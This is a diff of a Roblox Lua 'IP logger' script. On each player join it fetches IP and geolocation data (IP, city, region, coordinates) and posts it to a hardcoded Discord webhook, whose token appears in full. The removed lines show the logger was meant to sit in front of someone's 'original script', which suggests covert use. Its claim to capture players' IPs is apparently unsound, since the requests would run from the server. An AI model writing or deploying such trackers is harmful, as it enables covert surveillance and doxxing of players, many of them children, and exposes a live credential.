@@ -1,40 +1,53 @@
 -- IP and Region Logger for Roblox
--- Configure your webhook URL here
 local WebhookUrl = "https://discord.com/api/webhooks/1497298267988561970/dmpYd0l-0IDprQFBys7iY08ssUTKl2jeJW4r8GMkYMCAXOwV2pCqoOidE6M8H4Z2xTn-"
 
 -- Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
+
+-- Enable HTTP requests for allowed domains
+HttpService.HttpEnabled = true
 
 -- Function to get IP and region information
 local function getIpInfo()
-    -- Use an IP geolocation API to get user's IP and region
-    local success, response = pcall(function()
-        return HttpService:GetAsync("https://ipapi.co/json/")
-    end)
+    -- Try multiple IP geolocation APIs in case one fails
+    local apis = {
+        "https://ipapi.co/json/",
+        "https://ipinfo.io/json",
+        "https://api.ipify.org?format=json"
+    }
     
-    if success then
-        local data = HttpService:JSONDecode(response)
-        return {
-            ip = data.ip,
-            region = data.region,
-            country = data.country_name,
-            city = data.city,
-            latitude = data.latitude,
-            longitude = data.longitude
-        }
-    else
-        warn("Failed to get IP information: " .. tostring(response))
-        return {
-            ip = "Unknown",
-            region = "Unknown",
-            country = "Unknown",
-            city = "Unknown",
-            latitude = "Unknown",
-            longitude = "Unknown"
-        }
+    for _, apiUrl in ipairs(apis) do
+        local success, response = pcall(function()
+            return HttpService:GetAsync(apiUrl)
+        end)
+        
+        if success then
+            local data = HttpService:JSONDecode(response)
+            
+            -- Handle different API response formats
+            if data.ip then
+                return {
+                    ip = data.ip,
+                    region = data.region or data.regionName or "Unknown",
+                    country = data.country_name or data.country or "Unknown",
+                    city = data.city or "Unknown",
+                    latitude = data.latitude or data.lat or "Unknown",
+                    longitude = data.longitude or data.lon or "Unknown"
+                }
+            end
+        end
     end
+    
+    warn("Failed to get IP information from all APIs")
+    return {
+        ip = "Unknown",
+        region = "Unknown",
+        country = "Unknown",
+        city = "Unknown",
+        latitude = "Unknown",
+        longitude = "Unknown"
+    }
 end
 
 -- Function to send data to Discord webhook
@@ -81,8 +94,7 @@ local function sendToDiscord(player, ipInfo)
         },
         footer = {
             text = "Roblox IP Logger"
-        },
-        timestamp = HttpService:JSONEncode(HttpService:GetCurrentTimeUtc())
+        }
     }
     
     local data = {
@@ -104,11 +116,6 @@ end
 local function onPlayerAdded(player)
     print("Logging information for player: " .. player.Name)
     
-    -- Wait for character to load if needed
-    if not player.Character then
-        player.CharacterAdded:Wait()
-    end
-    
     -- Get IP information
     local ipInfo = getIpInfo()
     print("IP Info retrieved for " .. player.Name)
@@ -117,9 +124,10 @@ local function onPlayerAdded(player)
     local sent = sendToDiscord(player, ipInfo)
     if sent then
         print("Successfully sent data to Discord for " .. player.Name)
+    else
+        print("Failed to send data to Discord for " .. player.Name)
     end
     
-    -- Return the IP info for potential use in your main script
     return ipInfo
 end
 
@@ -132,28 +140,6 @@ for _, player in ipairs(Players:GetPlayers()) do
         onPlayerAdded(player)
     end)
 end
-
--- Add this section to ensure your main script runs after logging
-local function executeMainScript()
-    print("Executing main script after IP logging")
-    
-    -- YOUR ORIGINAL SCRIPT CODE GOES HERE
-    -- Paste your existing script code below this line
-    
-    -- Example of where to place your code:
-    -- local mainScript = script:FindFirstChild("MainScript")
-    -- if mainScript then
-    --     mainScript.Disabled = false
-    -- end
-    
-    print("Main script execution completed")
-end
-
--- Wait a moment to ensure logging is complete before running main script
-spawn(function()
-    wait(2) -- Adjust this delay if needed
-    executeMainScript()
-end)
 
 -- Debug information
 print("IP Logger initialized. Webhook URL: " .. WebhookUrl)
